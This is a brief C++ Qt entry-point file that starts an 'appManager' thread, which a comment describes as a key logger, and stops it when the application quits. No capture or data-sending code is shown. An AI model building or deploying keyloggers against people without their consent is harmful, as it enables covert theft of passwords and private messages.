#include <QCoreApplication>
#include "appManager.h"

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    appManager appMger;
    appMger.start(); // Start the key logger in a separate thread

    QObject::connect(&a, &QCoreApplication::aboutToQuit, [&]() {
        appMger.requestInterruption(); // Gracefully stop the logger
        appMger.wait();
    });

    return a.exec();
}
